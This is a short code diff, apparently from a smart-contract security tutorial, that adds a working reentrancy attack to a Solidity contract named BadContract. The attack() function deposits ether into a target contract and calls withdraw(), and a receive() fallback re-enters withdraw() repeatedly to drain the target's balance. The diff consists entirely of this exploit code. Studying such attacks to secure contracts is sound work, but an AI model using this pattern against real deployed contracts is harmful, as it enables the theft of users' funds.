@@ -11,5 +11,15 @@ contract BadContract {
         goodContract = GoodContract(_goodContractAddress);
     }
 
-
+    // Function to receive ether
+    receive() external payable {
+        if (address(goodContract).balance > 0) {
+            goodContract.withdraw();
+        }
+    }
+    // start the attack
+    function attack() public payable {
+        goodContract.deposit{value: msg.value}();
+        goodContract.withdraw();
+    }
 }
